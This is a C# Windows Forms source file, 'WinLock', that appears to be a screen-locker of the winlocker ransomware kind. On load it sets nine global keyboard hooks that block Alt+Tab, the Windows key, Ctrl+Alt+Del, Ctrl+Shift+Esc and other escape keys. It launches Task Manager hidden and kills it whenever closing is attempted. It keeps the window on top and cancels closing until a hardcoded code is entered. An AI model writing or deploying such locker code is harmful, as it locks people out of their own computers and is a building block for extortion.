using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinLock
{
    public partial class MyForm : Form
    {
        bool enableClosing=false;
        MyLock @lock = new MyLock("*999#");
        private int time = 1;

        public MyForm()
        {
            this.@lock.Unlock += new MyLock.UnlockDelegate(this.lock_Unlock);
            this.TopMost = true;
            this.InitializeComponent();
            this.Load += new EventHandler(this.MyForm_Load);
        }

        private void lock_Unlock()
        {
            this.enableClosing = true;
            this.Close();
        }

        private void button_Click(object sender, EventArgs e)
        {
            if (this.@lock.Check((sender as Button).Text[0]) == -1)
                Thread.Sleep(this.time * 100);
            ++this.time;
        }

        private void MyForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this.enableClosing)
                return;
            Process.GetProcessesByName("taskmgr")[0].Kill();
            e.Cancel = true;
        }

        private void MyForm_Load(object sender, EventArgs e)
        {
            SetHook();
            new Process()
            {
                StartInfo = {
                    WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System),
                    FileName = "taskmgr.exe",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            }.Start();
            
            this.Focus();
        }

        //Hooks data
        private const int WH_KEYBOARD_LL = 13;//Keyboard hook;

        //Keys data structure
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
        }

        //Using callbacks
        private LowLevelKeyboardProcDelegate m_callback;
        private LowLevelKeyboardProcDelegate m_callback_1;
        private LowLevelKeyboardProcDelegate m_callback_2;
        private LowLevelKeyboardProcDelegate m_callback_3;
        private LowLevelKeyboardProcDelegate m_callback_4;
        private LowLevelKeyboardProcDelegate m_callback_5;
        private LowLevelKeyboardProcDelegate m_callback_6;
        private LowLevelKeyboardProcDelegate m_callback_7;
        private LowLevelKeyboardProcDelegate m_callback_8;

        //Using hooks
        private IntPtr m_hHook;
        private IntPtr m_hHook_1;
        private IntPtr m_hHook_2;
        private IntPtr m_hHook_3;
        private IntPtr m_hHook_4;
        private IntPtr m_hHook_5;
        private IntPtr m_hHook_6;
        private IntPtr m_hHook_7;
        private IntPtr m_hHook_8;

        //Set hook on keyboard
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

        //Unhook keyboard
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //Hook handle
        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

        //Calling the next hook
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        //<Alt>+<Tab> blocking
        public IntPtr LowLevelKeyboardHookProc_alt_tab(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Tab)
                {
                    return (IntPtr)1;//<Alt>+<Tab> blocking
                }
            }
            return CallNextHookEx(m_hHook, nCode, wParam, lParam);//Go to next hook
        }

        //<Win>+<Ctrl>+<left> blocking
        public IntPtr LowLevelKeyboardHookProc_win_ctrl_left_right(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.Left || objKeyInfo.key == Keys.Right)
                {
                    return (IntPtr)1;//<Win>+<Ctrl>+<left> blocking
                }
            }
            return CallNextHookEx(m_hHook_7, nCode, wParam, lParam);//Go to next hook
        }

        //<Ctrl>+<Alt>+<Del> blocking
        public IntPtr LowLevelKeyboardHookProc_ctrl_alt_del(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Delete )
                {
                    return (IntPtr)1;//<Win>+<Ctrl>+<left> blocking
                }
            }
            return CallNextHookEx(m_hHook_8, nCode, wParam, lParam);//Go to next hook
        }

        //<WinKey> capturing
        public IntPtr LowLevelKeyboardHookProc_win(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin)
                {
                    return (IntPtr)1;//<WinKey> blocking
                }
            }
            return CallNextHookEx(m_hHook_1, nCode, wParam, lParam);//Go to next hook
        }

        //<Delete> capturing
        public IntPtr LowLevelKeyboardHookProc_del(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.Delete)
                {
                    return (IntPtr)1;//<Delete> blocking
                }
            }
            return CallNextHookEx(m_hHook_3, nCode, wParam, lParam);//Go to next hook
        }

        //<Control> capturing
        public IntPtr LowLevelKeyboardHookProc_ctrl(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.LControlKey)
                {
                    return (IntPtr)1;//<Control> blocking
                }
            }
            return CallNextHookEx(m_hHook_2, nCode, wParam, lParam);//Go to next hook
        }

        //<Alt> capturing
        public IntPtr LowLevelKeyboardHookProc_alt(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.Alt)
                {
                    return (IntPtr)1;//<Alt> blocking
                }
            }
            return CallNextHookEx(m_hHook_4, nCode, wParam, lParam);//Go to next hook
        }

        //<Alt>+<Space> blocking
        public IntPtr LowLevelKeyboardHookProc_alt_space(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Space)
                {
                    return (IntPtr)1;//<Alt>+<Space> blocking
                }
            }
            return CallNextHookEx(m_hHook_5, nCode, wParam, lParam);//Go to next hook
        }

        //<Control>+<Shift>+<Escape> blocking
        public IntPtr LowLevelKeyboardHookProc_control_shift_escape(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)//If not alredy captured
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.LShiftKey || objKeyInfo.key == Keys.RShiftKey || objKeyInfo.key == Keys.Escape)
                {
                    return (IntPtr)1;//<Control>+<Shift>+<Escape> blocking
                }
            }
            return CallNextHookEx(m_hHook_6, nCode, wParam, lParam);//Go to next hook
        }

        //Delegate for using hooks
        private delegate IntPtr LowLevelKeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        //Setting all hooks
        public void SetHook()
        {
            //Hooks callbacks by delegate
            m_callback = LowLevelKeyboardHookProc_win;
            m_callback_1 = LowLevelKeyboardHookProc_alt_tab;
            m_callback_2 = LowLevelKeyboardHookProc_ctrl;
            m_callback_3 = LowLevelKeyboardHookProc_del;
            m_callback_4 = LowLevelKeyboardHookProc_alt;
            m_callback_5 = LowLevelKeyboardHookProc_alt_space;
            m_callback_6 = LowLevelKeyboardHookProc_control_shift_escape;
            m_callback_7 = LowLevelKeyboardHookProc_win_ctrl_left_right;
            m_callback_8 = LowLevelKeyboardHookProc_ctrl_alt_del;
            //Hooks setting
            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_1 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_1, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_2 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_2, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_3 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_3, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_4 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_4, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_5 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_5, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_6 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_6, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_7 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_7, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_8 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_8, GetModuleHandle(IntPtr.Zero), 0);
        }

        //Keyboard unhooking
        public void Unhook()
        {
            UnhookWindowsHookEx(m_hHook);
            UnhookWindowsHookEx(m_hHook_1);
            UnhookWindowsHookEx(m_hHook_2);
            UnhookWindowsHookEx(m_hHook_3);
            UnhookWindowsHookEx(m_hHook_4);
            UnhookWindowsHookEx(m_hHook_5);
            UnhookWindowsHookEx(m_hHook_6);
            UnhookWindowsHookEx(m_hHook_7);
            UnhookWindowsHookEx(m_hHook_8);
        }

        //Set mouse event for further mouse emulation
        [DllImport("User32.dll")]
        static extern void mouse_event(MouseFlags dwFlags, int dx, int dy, int dwData, UIntPtr dwExtraInfo);

        //Mouse flags enum
        [Flags]
        enum MouseFlags
        {
            Move = 0x0001,
            LeftDown = 0x0002,
            LeftUp = 0x0004,
            RightDown = 0x0008,
            RightUp = 0x0010,
            Absolute = 0x8000
        };

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }
    }
}
